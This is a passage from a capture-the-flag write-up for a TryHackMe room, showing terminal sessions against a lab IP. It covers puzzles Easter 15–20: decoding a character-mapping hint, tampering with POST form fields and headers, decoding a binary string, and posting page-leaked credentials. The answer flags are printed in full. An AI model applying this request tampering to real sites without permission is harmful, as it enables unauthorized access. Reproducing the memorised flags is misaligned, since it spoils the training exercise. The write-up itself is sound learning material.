kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/game1/
<html>
        <head>
                <title>Game 1</title>
                <h1>Guess the combination</h1>
        </head>

        <body>
        <form method="POST">
                Your answer:<br>
                <input type="text" name="answer" required>
        </form>
                <p>Your hash: </p>
        <p>hints: 51 89 77 93 126 14 93 10 </p>
        </body>

</html>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl  -d "answer=ABCDEFGHIJKLMNOPQRSTUVWXYZ" -X POST  http://10.10.219.170/game1/
<html>
        <head>
                <title>Game 1</title>
                <h1>Guess the combination</h1>
        </head>

        <body>
        <form method="POST">
                Your answer:<br>
                <input type="text" name="answer" required>
        </form>
                <p>Your hash:  99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141</p>
        <p>hints: 51 89 77 93 126 14 93 10 </p>
        </body>

</html>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -d "answer=abcdefghijklmnopqrstuvwxyz" -X POST  http://10.10.219.170/game1/
<html>
        <head>
                <title>Game 1</title>
                <h1>Guess the combination</h1>
        </head>

        <body>
        <form method="POST">
                Your answer:<br>
                <input type="text" name="answer" required>
        </form>
                <p>Your hash:  89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18</p>
        <p>hints: 51 89 77 93 126 14 93 10 </p>
        </body>

</html>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$
```

```
51 89 77 93 126 14 93 10
G  a  m  e  O   v  e  r
```

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -d "answer=GameOver" -X POST  http://10.10.219.170/game1/
<html>
        <head>
                <title>Game 1</title>
                <h1>Guess the combination</h1>
        </head>

        <body>
        <form method="POST">
                Your answer:<br>
                <input type="text" name="answer" required>
        </form>
        Good job on completing the puzzle, Easter 15: THM{ju57_4_64m3}  <p>Your hash:  51 89 77 93 126 14 93 10</p>
        <p>hints: 51 89 77 93 126 14 93 10 </p>
        </body>

</html>
```

`THM{ju57_4_64m3}`

22. Easter 16

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -d "button1=button1&button2=button2&button3=button3" -X POST  http://10.10.219.170/game2/
<html>
        <head>
                <title>Game 2</title>
                <h1>Press the button simultaneously</h1>
        </head>
        <body>

        <form method="POST">
                <input type="hidden" name="button1" value="button1">
                <button name="submit" value="submit">Button 1</button>
        </form>

        <form method="POST">
                <input type="hidden" name="button2" value="button2">
                <button name="submit" value="submit">Button 2</button>
        </form>

        <form method="POST">
                <input type="hidden" name="button3" value="button3">
                <button name="submit" value="submit">Button 3</button>
        </form>
        Just temper the code and you are good to go. Easter 16: THM{73mp3r_7h3_h7ml}    </body>
</html>
```

`THM{73mp3r_7h3_h7ml}`

23. Easter 17

```html
<!--! Easter 17-->
<button onclick="nyan()">Mulfunction button</button><br />
<p id="nyan"></p>
<script>
  function catz() {
    document.getElementById("nyan").innerHTML =
      "100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101";
  }
</script>
```

```py
>>> b = '100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101'
>>> d = int(b, 2)
>>> d
31381767556396068451396213107418146737161460075387838039325522269201190105981
>>> h = hex(d)[2:]
>>> h
'4561737465722031373a2054484d7b6a355f6a355f6b33705f6433633064337d'
>>> bytes.fromhex(h).decode('ASCII')
'Easter 17: THM{j5_j5_k3p_d3c0d3}'
```

`THM{j5_j5_k3p_d3c0d3}`

24. Easter 18

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s -H "egg: Yes" http://10.10.219.170/  | grep -i "Easter 18"
        That's it, you just need to say YESSSSSSSSSS. Easter 18: THM{70ny_r0ll_7h3_366} <img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/>
```

`THM{70ny_r0ll_7h3_366}`

26. Easter 19

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ wget http://10.10.219.170/small
--2020-10-08 22:44:57--  http://10.10.219.170/small
Connecting to 10.10.219.170:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 689 [image/png]
Saving to: ‘small’

small                                             100%[=============================================================================================================>]     689  --.-KB/s    in 0s

2020-10-08 22:44:57 (108 MB/s) - ‘small’ saved [689/689]

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ file small
small: PNG image data, 900 x 100, 4-bit colormap, non-interlaced
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ cp small small.png
```

`THM{700_5m4ll_3yy}`

27. Easter 20

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/ | grep "easter 20"
        <h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s -d "username=DesKel&password=heIsDumb" -X POST http://10.10.219.170/ | grep -A1 "easter 20"
        <h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>
        Okay, you pass, Easter 20: THM{17_w45_m3_4ll_4l0n6}     <br><br><br>
```

`THM{17_w45_m3_4ll_4l0n6}`
